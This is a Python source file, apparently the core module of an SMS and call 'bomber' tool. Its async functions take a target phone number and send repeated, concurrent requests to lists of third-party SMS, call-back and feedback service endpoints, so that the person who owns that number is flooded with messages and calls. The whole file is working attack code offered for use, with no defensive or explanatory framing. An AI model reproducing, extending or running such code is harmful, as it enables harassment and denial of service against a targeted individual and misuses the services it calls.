import asyncio
import logging
from aiohttp import ClientSession
from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config


async def request(session, url):
    try:
        config = check_config()
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if config['type_attack'] == 'MIX' else config['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=10) as response:
                return await response.text()
    except Exception as e:
        logging.error(f"Error requesting {url['url']}: {e}")
        pass


async def async_attacks(number, session):
    config = check_config()
    services = (urls(number) + feedback_urls(number)) if config['feedback'] == 'True' else urls(number)
    tasks = [asyncio.create_task(request(session, service)) for service in services]
    await asyncio.gather(*tasks)


def start_async_attacks(number, replay):
    '''Запуск бомбера'''
    async def run_attacks():
        async with ClientSession() as session:
            for _ in range(int(replay)):
                await async_attacks(number, session)

    asyncio.run(run_attacks())
